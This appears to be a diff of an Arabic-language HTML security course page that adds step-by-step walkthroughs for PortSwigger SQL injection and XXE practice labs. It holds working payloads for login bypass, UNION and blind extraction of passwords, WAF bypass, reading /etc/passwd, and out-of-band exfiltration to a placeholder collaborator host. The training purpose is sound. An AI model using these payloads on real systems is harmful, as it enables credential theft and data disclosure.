@@ -559,10 +559,16 @@ Password: anything</code></pre>
                 مختبرات SQL Injection العملية
             </h2>
 
+            <!-- Error-Based SQL Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-exclamation-triangle"></i>
+                مختبرات Error-Based SQL Injection
+            </h3>
+
             <div class="lab-card">
                 <div class="lab-title">
                     <i class="fas fa-play"></i>
-                    المختبر الأول: SQL injection vulnerability in WHERE clause
+                    Lab 1: SQL injection vulnerability in WHERE clause allowing retrieval of hidden data
                 </div>
                 <div class="lab-url">
                     <a href="https://portswigger.net/web-security/sql-injection/lab-retrieve-hidden-data" target="_blank" style="color: #64b5f6; text-decoration: none;">
@@ -584,7 +590,35 @@ Password: anything</code></pre>
             <div class="lab-card">
                 <div class="lab-title">
                     <i class="fas fa-play"></i>
-                    المختبر الثاني: SQL injection UNION attack
+                    Lab 2: SQL injection vulnerability allowing login bypass
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/lab-login-bypass" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/lab-login-bypass
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز صفحة تسجيل الدخول باستخدام SQL injection.</p>
+                
+                <ol class="step-list">
+                    <li>افتح المختبر وانتقل لصفحة تسجيل الدخول</li>
+                    <li>في حقل Username اكتب: <code>administrator'--</code></li>
+                    <li>في حقل Password اكتب أي شيء</li>
+                    <li>اضغط Log in وستتم عملية تسجيل الدخول</li>
+                    <li>ستدخل بحساب administrator</li>
+                </ol>
+            </div>
+
+            <!-- Union-Based SQL Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-link"></i>
+                مختبرات Union-Based SQL Injection
+            </h3>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 3: SQL injection UNION attack, determining the number of columns
                 </div>
                 <div class="lab-url">
                     <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns" target="_blank" style="color: #64b5f6; text-decoration: none;">
@@ -606,7 +640,57 @@ Password: anything</code></pre>
             <div class="lab-card">
                 <div class="lab-title">
                     <i class="fas fa-play"></i>
-                    المختبر الثالث: Blind SQL injection with conditional responses
+                    Lab 4: SQL injection UNION attack, finding a column containing text
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/union-attacks/lab-find-column-containing-text
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> العثور على العمود الذي يمكن أن يحتوي على نص.</p>
+                
+                <ol class="step-list">
+                    <li>حدد عدد الأعمدة أولاً باستخدام ORDER BY</li>
+                    <li>استخدم UNION SELECT مع NULL values</li>
+                    <li>استبدل كل NULL بالنص المطلوب واحداً تلو الآخر</li>
+                    <li>مثال: <code>' UNION SELECT NULL,'random_text',NULL--</code></li>
+                    <li>ابحث عن العمود الذي يعرض النص دون خطأ</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 5: SQL injection UNION attack, retrieving data from other tables
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/union-attacks/lab-retrieve-data-from-other-tables
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخراج البيانات من جداول أخرى.</p>
+                
+                <ol class="step-list">
+                    <li>حدد عدد الأعمدة والأعمدة النصية</li>
+                    <li>استخدم UNION لاستخراج البيانات من جدول users</li>
+                    <li>Payload: <code>' UNION SELECT username, password FROM users--</code></li>
+                    <li>ابحث عن بيانات المستخدم administrator</li>
+                    <li>استخدم كلمة المرور لتسجيل الدخول</li>
+                </ol>
+            </div>
+
+            <!-- Blind SQL Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-eye-slash"></i>
+                مختبرات Blind SQL Injection
+            </h3>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 6: Blind SQL injection with conditional responses
                 </div>
                 <div class="lab-url">
                     <a href="https://portswigger.net/web-security/sql-injection/blind/lab-conditional-responses" target="_blank" style="color: #64b5f6; text-decoration: none;">
@@ -626,6 +710,247 @@ Password: anything</code></pre>
                     <li>تأكد من وجود جدول users: <code>xyz' AND (SELECT 'a' FROM users LIMIT 1)='a</code></li>
                     <li>اختبر وجود administrator: <code>xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a</code></li>
                     <li>استخرج طول كلمة المرور واستخدم Burp Intruder لاستخراجها حرف بحرف</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 7: Blind SQL injection with time delays
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/blind/lab-time-delays
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تأكيد وجود SQL injection باستخدام time delays.</p>
+                
+                <ol class="step-list">
+                    <li>اعترض أي طلب واعثر على tracking cookie</li>
+                    <li>جرب payload مع time delay: <code>xyz'; SELECT pg_sleep(10)--</code></li>
+                    <li>إذا تأخرت الاستجابة 10 ثوانٍ، فهناك SQL injection</li>
+                    <li>جرب payloads مختلفة حسب نوع قاعدة البيانات</li>
+                    <li>MySQL: <code>'; SELECT SLEEP(10)--</code></li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 8: Blind SQL injection with time delays and information retrieval
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/blind/lab-time-delays-info-retrieval
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخدام time-based blind SQL injection لاستخراج البيانات.</p>
+                
+                <ol class="step-list">
+                    <li>استخدم time delay مع conditional logic</li>
+                    <li>مثال: <code>xyz'; SELECT CASE WHEN (username='administrator') THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users--</code></li>
+                    <li>استخرج طول كلمة المرور: <code>xyz'; SELECT CASE WHEN (LENGTH(password)>1) THEN pg_sleep(10) ELSE pg_sleep(0) END FROM users WHERE username='administrator'--</code></li>
+                    <li>استخرج كل حرف من كلمة المرور باستخدام SUBSTRING</li>
+                    <li>استخدم كلمة المرور لتسجيل الدخول</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 9: Blind SQL injection with out-of-band interaction
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخدام out-of-band techniques لتأكيد SQL injection.</p>
+                
+                <ol class="step-list">
+                    <li>احصل على Burp Collaborator URL</li>
+                    <li>استخدم DNS lookup payload: <code>xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;?xml+version="1.0"+encoding="UTF-8"?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%+remote+SYSTEM+"http://YOUR-COLLABORATOR/"&gt;%remote;]&gt;'),'/l')+FROM+dual--</code></li>
+                    <li>راقب Collaborator للطلبات الواردة</li>
+                    <li>هذه الطريقة مفيدة عندما تفشل time delays</li>
+                    <li>يمكن استخدامها أيضاً لاستخراج البيانات</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 10: Blind SQL injection with out-of-band data exfiltration
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخراج البيانات باستخدام out-of-band techniques.</p>
+                
+                <ol class="step-list">
+                    <li>استخدم payload يرسل البيانات عبر DNS:</li>
+                    <li><code>xyz'+UNION+SELECT+EXTRACTVALUE(xmltype('&lt;?xml+version="1.0"+encoding="UTF-8"?&gt;&lt;!DOCTYPE+root+[+&lt;!ENTITY+%+remote+SYSTEM+"http://'||(SELECT+password+FROM+users+WHERE+username='administrator')||'.YOUR-COLLABORATOR/"&gt;%remote;]&gt;'),'/l')+FROM+dual--</code></li>
+                    <li>راقب Collaborator وستجد كلمة المرور في subdomain</li>
+                    <li>استخدم كلمة المرور لتسجيل الدخول</li>
+                    <li>هذه طريقة قوية لاستخراج البيانات دون انتظار</li>
+                </ol>
+            </div>
+
+            <!-- Database Examination Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-database"></i>
+                مختبرات فحص قاعدة البيانات
+            </h3>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 11: SQL injection attack, querying the database type and version on Oracle
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-oracle
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تحديد نوع وإصدار Oracle database.</p>
+                
+                <ol class="step-list">
+                    <li>حدد عدد الأعمدة باستخدام ORDER BY</li>
+                    <li>استخدم UNION SELECT للحصول على معلومات Oracle:</li>
+                    <li><code>' UNION SELECT banner, NULL FROM v$version--</code></li>
+                    <li>أو: <code>' UNION SELECT version, NULL FROM v$instance--</code></li>
+                    <li>ستحصل على معلومات مفصلة عن قاعدة البيانات</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 12: SQL injection attack, querying the database type and version on MySQL and Microsoft
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/examining-the-database/lab-querying-database-version-mysql-microsoft
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تحديد نوع وإصدار MySQL أو Microsoft SQL Server.</p>
+                
+                <ol class="step-list">
+                    <li>حدد عدد الأعمدة والأعمدة النصية</li>
+                    <li>للMySQL: <code>' UNION SELECT @@version, NULL#</code></li>
+                    <li>للMicrosoft SQL Server: <code>' UNION SELECT @@version, NULL--</code></li>
+                    <li>يمكن أيضاً استخدام: <code>' UNION SELECT version(), NULL#</code></li>
+                    <li>ستحصل على نوع وإصدار قاعدة البيانات</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 13: SQL injection attack, listing the database contents on non-Oracle databases
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-non-oracle
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استكشاف محتوى قاعدة البيانات واستخراج بيانات المستخدمين.</p>
+                
+                <ol class="step-list">
+                    <li>اعرض جميع الجداول: <code>' UNION SELECT table_name, NULL FROM information_schema.tables--</code></li>
+                    <li>ابحث عن جدول يحتوي على بيانات المستخدمين</li>
+                    <li>اعرض أعمدة الجدول: <code>' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users_table_name'--</code></li>
+                    <li>استخرج البيانات: <code>' UNION SELECT username_column, password_column FROM users_table_name--</code></li>
+                    <li>استخدم بيانات administrator لتسجيل الدخول</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 14: SQL injection attack, listing the database contents on Oracle
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/examining-the-database/lab-listing-database-contents-oracle
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استكشاف محتوى Oracle database.</p>
+                
+                <ol class="step-list">
+                    <li>اعرض جميع الجداول: <code>' UNION SELECT table_name, NULL FROM all_tables--</code></li>
+                    <li>ابحث عن جدول المستخدمين</li>
+                    <li>اعرض الأعمدة: <code>' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_TABLE'--</code></li>
+                    <li>استخرج البيانات مع ضرورة استخدام dual: <code>' UNION SELECT username, password FROM users_table--</code></li>
+                    <li>استخدم بيانات administrator للدخول</li>
+                </ol>
+            </div>
+
+            <!-- Advanced SQL Injection Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-rocket"></i>
+                مختبرات SQL Injection المتقدمة
+            </h3>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 15: SQL injection with filter bypass via XML encoding
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/lab-sql-injection-with-filter-bypass-via-xml-encoding
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> تجاوز WAF باستخدام XML encoding.</p>
+                
+                <div class="tip-box">
+                    <strong>تقنية متقدمة:</strong> استخدام XML encoding لتجاوز فلاتر الأمان.
+                </div>
+
+                <ol class="step-list">
+                    <li>اكتشف أن التطبيق يحتوي على WAF يحجب payloads عادية</li>
+                    <li>استخدم XML encoding: <code>&amp;#x27;</code> بدلاً من <code>'</code></li>
+                    <li>مثال: <code>1&amp;#x20;UNION&amp;#x20;SELECT&amp;#x20;NULL</code></li>
+                    <li>أو استخدم hex encoding للPayload بالكامل</li>
+                    <li>هذه الطريقة تتجاوز معظم WAF systems</li>
+                </ol>
+            </div>
+
+            <!-- Second-order SQL Injection -->
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 16: Second-order SQL injection
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/sql-injection/lab-second-order" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/sql-injection/lab-second-order
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استغلال second-order SQL injection لتغيير كلمة مرور administrator.</p>
+                
+                <div class="tip-box">
+                    <strong>ملاحظة:</strong> Second-order SQL injection يحدث عندما يتم تخزين البيانات أولاً ثم استخدامها لاحقاً في استعلام SQL.
+                </div>
+
+                <ol class="step-list">
+                    <li>سجل حساب جديد باسم: <code>administrator'--</code></li>
+                    <li>سجل دخول بالحساب الجديد</li>
+                    <li>انتقل لصفحة تغيير كلمة المرور</li>
+                    <li>عند تغيير كلمة المرور، سيتم استخدام username في SQL query</li>
+                    <li>بسبب <code>'--</code> في الاسم، سيتم تحديث كلمة مرور administrator بدلاً من المستخدم الحالي</li>
                 </ol>
             </div>
         </div>
@@ -779,10 +1104,16 @@ echo $dom->saveXML();
                 مختبرات XXE العملية
             </h2>
 
+            <!-- Basic XXE Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-file-alt"></i>
+                مختبرات XXE الأساسية - File Disclosure
+            </h3>
+
             <div class="lab-card">
                 <div class="lab-title">
                     <i class="fas fa-play"></i>
-                    المختبر الأول: Exploiting XXE using external entities to retrieve files
+                    Lab 1: Exploiting XXE using external entities to retrieve files
                 </div>
                 <div class="lab-url">
                     <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-retrieve-files" target="_blank" style="color: #64b5f6; text-decoration: none;">
@@ -801,10 +1132,16 @@ echo $dom->saveXML();
                 </ol>
             </div>
 
+            <!-- SSRF via XXE Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-globe"></i>
+                مختبرات XXE - SSRF Attacks
+            </h3>
+
             <div class="lab-card">
                 <div class="lab-title">
                     <i class="fas fa-play"></i>
-                    المختبر الثاني: Exploiting XXE to perform SSRF attacks
+                    Lab 2: Exploiting XXE to perform SSRF attacks
                 </div>
                 <div class="lab-url">
                     <a href="https://portswigger.net/web-security/xxe/lab-exploiting-xxe-to-perform-ssrf" target="_blank" style="color: #64b5f6; text-decoration: none;">
@@ -824,10 +1161,16 @@ echo $dom->saveXML();
                 </ol>
             </div>
 
+            <!-- Blind XXE Labs -->
+            <h3 class="subsection-title">
+                <i class="fas fa-eye-slash"></i>
+                مختبرات Blind XXE
+            </h3>
+
             <div class="lab-card">
                 <div class="lab-title">
                     <i class="fas fa-play"></i>
-                    المختبر الثالث: Blind XXE with out-of-band interaction
+                    Lab 3: Blind XXE with out-of-band interaction
                 </div>
                 <div class="lab-url">
                     <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction" target="_blank" style="color: #64b5f6; text-decoration: none;">
@@ -847,6 +1190,136 @@ echo $dom->saveXML();
                     <li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY xxe SYSTEM "http://YOUR-COLLABORATOR-URL"&gt; ]&gt;</code></li>
                     <li>أرسل الطلب وراقب Collaborator للطلبات الواردة</li>
                     <li>إذا وصل طلب، فهناك XXE vulnerability</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 4: Blind XXE with out-of-band interaction via XML parameter entities
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-interaction-using-parameter-entities
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخدام XML parameter entities في Blind XXE.</p>
+                
+                <ol class="step-list">
+                    <li>احصل على Burp Collaborator URL</li>
+                    <li>استخدم parameter entity payload:</li>
+                    <li><code>&lt;!DOCTYPE foo [ &lt;!ENTITY % xxe SYSTEM "http://YOUR-COLLABORATOR-URL"&gt; %xxe; ]&gt;</code></li>
+                    <li>راقب Collaborator للطلبات الواردة</li>
+                    <li>Parameter entities يمكن أن تعمل عندما تفشل regular entities</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 5: Exploiting blind XXE to exfiltrate data using a malicious external DTD
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/xxe/blind/lab-xxe-with-out-of-band-exfiltration
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخراج البيانات باستخدام external DTD.</p>
+                
+                <div class="tip-box">
+                    <strong>ملاحظة:</strong> ستحتاج لإنشاء external DTD على خادم تحت سيطرتك.
+                </div>
+
+                <ol class="step-list">
+                    <li>أنشئ DTD file على خادم خارجي يحتوي على:</li>
+                    <li><code>&lt;!ENTITY % file SYSTEM "file:///etc/hostname"&gt;&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; exfiltrate SYSTEM 'http://YOUR-COLLABORATOR/?x=%file;'&gt;"&gt;%eval;%exfiltrate;</code></li>
+                    <li>استخدم payload يستدعي DTD الخارجي:</li>
+                    <li><code>&lt;!DOCTYPE foo [&lt;!ENTITY % xxe SYSTEM "http://YOUR-SERVER/malicious.dtd"&gt; %xxe;]&gt;</code></li>
+                    <li>راقب Collaborator لتلقي البيانات المستخرجة</li>
+                </ol>
+            </div>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 6: Exploiting blind XXE to retrieve data via error messages
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/xxe/blind/lab-xxe-with-data-retrieval-via-error-messages
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخراج البيانات عبر رسائل الخطأ.</p>
+                
+                <ol class="step-list">
+                    <li>أنشئ DTD خارجي يحدث خطأ متعمد:</li>
+                    <li><code>&lt;!ENTITY % file SYSTEM "file:///etc/passwd"&gt;&lt;!ENTITY % eval "&lt;!ENTITY &amp;#x25; error SYSTEM 'file:///nonexistent/%file;'&gt;"&gt;%eval;%error;</code></li>
+                    <li>استخدم payload للإشارة للDTD الخارجي</li>
+                    <li>ستظهر رسالة خطأ تحتوي على محتوى الملف</li>
+                    <li>هذه الطريقة مفيدة عندما لا يمكن استخدام out-of-band</li>
+                </ol>
+            </div>
+
+            <!-- XXE via File Upload -->
+            <h3 class="subsection-title">
+                <i class="fas fa-upload"></i>
+                مختبرات XXE عبر File Upload
+            </h3>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 7: Exploiting XXE via image file upload
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/xxe/lab-xxe-via-file-upload
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استغلال XXE عبر رفع ملف صورة SVG خبيث.</p>
+                
+                <ol class="step-list">
+                    <li>انتقل لصفحة My Account وسجل دخول</li>
+                    <li>أنشئ ملف SVG يحتوي على XXE payload:</li>
+                    <li><code>&lt;?xml version="1.0" standalone="yes"?&gt;&lt;!DOCTYPE test [ &lt;!ENTITY xxe SYSTEM "file:///etc/hostname" &gt; ]&gt;&lt;svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg"&gt;&lt;text font-size="16" x="0" y="16"&gt;&amp;xxe;&lt;/text&gt;&lt;/svg&gt;</code></li>
+                    <li>ارفع الملف كصورة avatar</li>
+                    <li>ستظهر البيانات المستخرجة في الصورة</li>
+                </ol>
+            </div>
+
+            <!-- XXE in Different Contexts -->
+            <h3 class="subsection-title">
+                <i class="fas fa-cogs"></i>
+                مختبرات XXE في سياقات مختلفة
+            </h3>
+
+            <div class="lab-card">
+                <div class="lab-title">
+                    <i class="fas fa-play"></i>
+                    Lab 8: Exploiting XInclude to retrieve files
+                </div>
+                <div class="lab-url">
+                    <a href="https://portswigger.net/web-security/xxe/lab-xinclude-attack" target="_blank" style="color: #64b5f6; text-decoration: none;">
+                        <i class="fas fa-external-link-alt"></i>
+                        https://portswigger.net/web-security/xxe/lab-xinclude-attack
+                    </a>
+                </div>
+                <p><strong>الهدف:</strong> استخدام XInclude attack لقراءة الملفات.</p>
+                
+                <div class="tip-box">
+                    <strong>ملاحظة:</strong> XInclude مفيد عندما لا تتحكم في XML document بالكامل.
+                </div>
+
+                <ol class="step-list">
+                    <li>ابحث عن parameter يتم إدراجه في XML document</li>
+                    <li>استخدم XInclude payload:</li>
+                    <li><code>&lt;foo xmlns:xi="http://www.w3.org/2001/XInclude"&gt;&lt;xi:include parse="text" href="file:///etc/passwd"/&gt;&lt;/foo&gt;</code></li>
+                    <li>أرسل الطلب وستحصل على محتوى الملف</li>
+                    <li>هذا مفيد عندما تكون البيانات embedded في XML</li>
                 </ol>
             </div>
         </div>
